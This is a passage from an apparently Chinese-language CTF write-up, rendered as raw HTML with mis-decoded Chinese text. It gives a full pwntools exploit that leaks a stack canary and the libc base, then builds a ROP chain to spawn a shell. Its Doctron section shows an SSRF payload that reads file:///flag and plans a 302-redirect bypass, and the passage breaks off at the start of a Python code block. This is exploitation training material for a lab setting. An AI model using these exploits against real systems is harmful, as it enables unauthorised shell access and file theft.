mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>S</mi><mi>Y</mi><mi>S</mi><mi>T</mi><mi>E</mi><mi>M</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">system\_addr=libc\_base\_addr+SYSTEM\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>ç»ˆäºçš„ç»ˆäºï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¼˜é›…ä¸”é‚ªæ¶ã®ROPé“¾äº†ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ˆç”±ä¸Šå¾€ä¸‹åœ°å€å‡å°</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|     <span class="selector-tag">__libc_system</span> <span class="selector-tag">addr</span>     | â† è°ƒç”¨ <span class="selector-tag">system</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">ret</span> <span class="selector-tag">addr</span> (<span class="number">8</span>bytes)    | â† åœ°å€ä»¥<span class="number">0</span><span class="selector-tag">x10</span>å¯¹é½</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|   &quot;/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>&quot; <span class="selector-tag">string</span> <span class="selector-tag">addr</span>    | â† å‚æ•°</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | â† æ§åˆ¶ <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ â† <span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª ROP é“¾çš„é•¿åº¦éœ€è¦æ»¡è¶³ <code>strlen(buf) &lt;= 16</code> çš„æ¡ä»¶ï¼Œä»¥ä¾¿é€€å‡º <code>vuln</code> å¾ªç¯ã€‚è¿™é‡Œéœ€è¦<strong>æ³¨æ„æ ˆå¯¹é½</strong>ï¼Œ system() å‡½æ•°ä¸­å­˜åœ¨è¿™æ ·çš„æŒ‡ä»¤ï¼Œå®ƒè¦æ±‚æ ˆæŒ‰ç…§ <code>0x10</code> å¯¹é½ï¼Œåœ¨ ROP é“¾ä¸­å¢åŠ â¼€æ¡ ret æŒ‡ä»¤çš„ Gadgetï¼Œå°† rsp ç§»åŠ¨ 0x8 å®Œæˆå¯¹â»¬ã€‚</p><p>æœ€åï¼Œä¸€é”®å‘é€ï¼<img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc2.png" alt="wmc2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln å‡½æ•°ä¸­ buf åˆ°è¿”å›åœ°å€çš„åç§»é‡</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d19: b8 00 00 00 00 Â  Â  Â  Â  Â mov Â  Â $0x0,%eax</span></span><br><span class="line">RELATVE_RET_ADDR = <span class="number">0x1d19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 29d90: Â  Â 89 c7 Â  Â  Â mov Â  Â %eax,%edi</span></span><br><span class="line">LIBC_OFFSET = <span class="number">0x29d90</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ä¸­ Gadget çš„åç§»é‡</span></span><br><span class="line">POP_RDI_OFFSET = <span class="number">0x2a3e5</span> Â  Â  Â  Â  <span class="comment"># pop rdi; ret</span></span><br><span class="line">SYSTEM_OFFSET Â = <span class="number">0x50d74</span> Â  Â  Â  Â  <span class="comment"># system func</span></span><br><span class="line">BIN_SH_OFFSET Â = <span class="number">0x1d8678</span> Â  Â  Â  Â <span class="comment"># &quot;/bin/sh&quot; string</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">canary_value_bytes = <span class="string">b&#x27;&#x27;</span> Â  Â <span class="comment"># Canary values</span></span><br><span class="line">program_base_addr Â = <span class="number">0</span> Â  Â  Â <span class="comment"># Base address of running program</span></span><br><span class="line">libc_base_addr Â  Â  = <span class="number">0</span> Â  Â  Â <span class="comment"># Base address of libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;[*] å¼€å§‹è§£å†³æ‰«é›·æ¸¸æˆ...&quot;</span>)</span><br><span class="line"><span class="comment"># .......</span></span><br><span class="line">Â  Â  <span class="comment"># ç­‰å¾…èƒœåˆ©æç¤ºç¬¦</span></span><br><span class="line">Â  Â  r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;è¿›å…¥canaryè·å–é˜¶æ®µ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  leak_padding_size = CANARY_OFFSET_FROM_BUF </span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ²é‡‘ä¸é›€...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline() </span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">  </span><br><span class="line">Â  Â  Â  Â  canary_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„é‡‘ä¸é›€è¡Œ: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  canary_7_bytes = canary_line[:<span class="number">7</span>]</span><br><span class="line">Â  Â  Â  Â  canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–é‡‘ä¸é›€ï¼ˆé‡æ„å‰ 7 å­—èŠ‚ï¼‰: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„é‡‘ä¸é›€: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„é‡‘ä¸é›€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)ï¼Œå¯èƒ½æå–é”™è¯¯æˆ–é‡‘ä¸é›€ç»“æ„ä¸åŒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;é‡‘ä¸é›€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_base</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> libc_base_addr</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å°è¯•æ£€æµ‹ libc å‡½æ•°åœ°å€...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># 32 + 7 * 8 - 1 + 1 = 88 å­—èŠ‚æ—¶ï¼Œå¾—åˆ°äº†ä¸€ä¸ª0x7ffe39968512?</span></span><br><span class="line">Â  Â  leak_padding_size = <span class="number">8</span> * <span class="number">13</span> -<span class="number">1</span></span><br><span class="line">Â  Â  leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€æ³„éœ² payload (é•¿åº¦åŒ…æ‹¬æ¢è¡Œç¬¦): <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)+<span class="number">1</span>&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># å‘é€æ³„éœ² payload</span></span><br><span class="line">Â  Â  r.sendline(leak_payload)</span><br><span class="line">Â  Â  log.debug(<span class="string">&quot;æ³„éœ² payload å·²å‘é€ã€‚ç­‰å¾… Leaderboard...&quot;</span>)</span><br><span class="line">Â  Â  log.info(<span class="string">&quot;æ¥æ”¶è¾“å‡ºä»¥æ³„éœ² libc base address...&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">&quot;æ¥æ”¶åˆ° Leaderboard æ ‡è®°ã€‚å‡†å¤‡æ¥æ”¶æ³„éœ²è¡Œ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  padding_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.debug(<span class="string">f&quot;æ¥æ”¶åˆ°å¡«å……è¡Œ: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  libc_line = r.recvline()</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„ libc è¡Œ: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  end_index = libc_line.index(<span class="number">0x20</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  log.error(<span class="string">&quot;libc è¡Œä¸ºç©ºï¼æ²¡èƒ½è¯»åˆ°ç›¸å…³ä¿¡æ¯&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># æ ¹æ®åç§»é‡è®¡ç®—ç¨‹åºè¿è¡Œçš„åŸºåœ°å€</span></span><br><span class="line">Â  Â  Â  Â  libc_base_addr = <span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>) - LIBC_OFFSET</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;æˆåŠŸæå–åˆ°éƒ¨åˆ†çš„ libc åœ°å€ä¸º: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„ libc åœ°å€: <span class="subst">&#123;libc_bias&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  log.success(<span class="string">f&quot;è®¡ç®—å¾—åˆ° libc è¿è¡ŒåŸºåœ°å€: <span class="subst">&#123;libc_base_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.warning(<span class="string">f&quot;é‡æ„åçš„ libc åœ°å€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)ï¼&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â log.info(<span class="string">f&quot;è¿”å›åœ°å€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> EOFError:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;è¿æ¥åœ¨æ³„éœ²é˜¶æ®µå…³é—­ï¼Œè¯·è°ƒè¯•ã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">&quot;å¯èƒ½æ³„éœ² payload å¯¼è‡´ç¨‹åºç«‹å³å´©æºƒã€‚&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  Â log.error(<span class="string">f&quot;è§£æè¾“å‡ºæ—¶å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rop_attack</span>(<span class="params">r</span>):</span><br><span class="line">Â  Â  <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">Â  Â  <span class="keyword">global</span> program_base_addr</span><br><span class="line">Â  Â  <span class="keyword">global</span> libc_base_addr</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;å‡†å¤‡æ„é€  ROP payload...&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  pop_rdi_ret = libc_base_addr + POP_RDI_OFFSET</span><br><span class="line">Â  Â  system_addr = libc_base_addr + SYSTEM_OFFSET</span><br><span class="line">Â  Â  binsh_addr Â = libc_base_addr + BIN_SH_OFFSET</span><br><span class="line"></span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;pop rdi ; ret gadget addr: <span class="subst">&#123;pop_rdi_ret:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;system() addr: <span class="subst">&#123;system_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  log.success(<span class="string">f&quot;&#x27;/bin/sh&#x27; addr: <span class="subst">&#123;binsh_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># æ„é€ æœ€ç»ˆä¹‹æ— æ•Œä¼˜é›…é‚ªæ¶ã®ROP payload</span></span><br><span class="line">Â  Â  padding Â = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment"># 8å­—èŠ‚buf + 8å­—èŠ‚æ— ç”¨ç©ºé—´</span></span><br><span class="line">Â  Â  payload Â = padding</span><br><span class="line">Â  Â  payload += canary_value_bytes Â  Â  Â  Â  Â  Â <span class="comment"># 8å­—èŠ‚ canary</span></span><br><span class="line">Â  Â  payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="comment"># old rbp</span></span><br><span class="line">Â  Â  payload += p64(pop_rdi_ret) Â  Â  Â  Â  Â  Â  Â <span class="comment"># gadget: pop rdi ; ret</span></span><br><span class="line">Â  Â  payload += p64(binsh_addr) Â  Â  Â  Â  Â  Â  Â  <span class="comment"># å‚æ•°ï¼šæŒ‡å‘ &quot;/bin/sh&quot;</span></span><br><span class="line">Â  Â  payload += p64(pop_rdi_ret+<span class="number">1</span>) Â  Â  Â  Â  Â  Â <span class="comment"># retï¼šä½¿æ ˆæŒ‰ç…§ 0x10 å¯¹â»¬</span></span><br><span class="line">Â  Â  payload += p64(system_addr) Â  Â  Â  Â  Â  Â  Â <span class="comment"># è°ƒç”¨ system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">f&quot;å‘é€ ROP payload (é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">Â  Â  r.sendline(payload)</span><br><span class="line"></span><br><span class="line">Â  Â  log.info(<span class="string">&quot;ROP payload å·²å‘é€ï¼Œå°è¯•è¿›å…¥äº¤äº’æ¨¡å¼...&quot;</span>)</span><br><span class="line">Â  Â  r.interactive()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ä¸»ç¨‹åºå…¥å£</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">Â  Â  context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">Â  Â  context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">try</span>:</span><br><span class="line">Â  Â  Â  Â  conn = remote(HOST, PORT)</span><br><span class="line">Â  Â  Â  Â  log.info(<span class="string">f&quot;æˆåŠŸè¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">Â  Â  Â  Â  log.error(<span class="string">f&quot;è¿æ¥åˆ° <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">Â  Â  Â  Â  exit()</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># è§£å†³æ‰«é›·æ¸¸æˆ</span></span><br><span class="line">Â  Â  solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment"># Phaze 1: è·å–Canary</span></span><br><span class="line">Â  Â  get_canary(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#Phaze 2: å°è¯•è·å– libc å‡½æ•°åœ°å€</span></span><br><span class="line">Â  Â  get_libc_base(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#Phaze 3: æ„é€ æœ€ç»ˆ ROP æ”»å‡»é“¾ï¼</span></span><br><span class="line">Â  Â  rop_attack(conn)</span><br><span class="line"></span><br><span class="line">Â  Â  conn.close()</span><br></pre></td></tr></table></figure><h1 id="doc-tron"><a class="markdownIt-Anchor" href="#doc-tron"></a> Doc. Tron</h1><p>Doctron æä¾›äº†å¤šä¸ªæ¥æ”¶ URL å‚æ•°è¿›è¡Œæ–‡æ¡£è½¬æ¢çš„æ¥å£ï¼Œå…¶ä¸­å­˜åœ¨ <strong>SSRF</strong> æ¼æ´çš„å¯èƒ½æ€§ã€‚</p><p>åˆæ­¥å°è¯•ç›´æ¥ä½¿ç”¨ <code>file:///flag</code> ä½œä¸º <code>url</code> å‚æ•°è®¿é—® <code>/convert/html2pdf</code> æˆ– <code>/convert/html2image</code> æ¥å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure><p>ç»“æœæ”¶åˆ°äº† <code>&#123;&quot;code&quot;:10000004,&quot;message&quot;:&quot;only support http/https&quot;,&quot;data&quot;:null&#125;</code> çš„é”™è¯¯ã€‚é€šè¿‡åˆ†æ <code>params.go</code> ä»£ç ï¼Œå‘ç° <code>CheckParams</code> middleware æ˜ç¡®æ ¡éªŒäº† <code>url</code> å‚æ•°çš„åè®®ï¼Œåªå…è®¸ http æˆ– httpsã€‚</p><p>æ—¢ç„¶ç›´æ¥ä½¿ç”¨ <code>file:///</code> è¢«åè®®æ ¡éªŒé˜»æ­¢ï¼Œé‚£ä¹ˆç”¨ç»å…¸çš„ SSRF ç»•è¿‡æŠ€å·§ï¼Œé€šè¿‡ HTTP 302 è·³è½¬ã€‚åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œé…ç½®å…¶å¯¹ä»»æ„è¯·æ±‚éƒ½ 302 è·³è½¬åˆ° <code>file:///flag</code>ã€‚ç„¶åè®© Doctron é€šè¿‡ SSRF è®¿é—®è¿™ä¸ªæœ¬åœ°æœåŠ¡å™¨çš„ URLã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 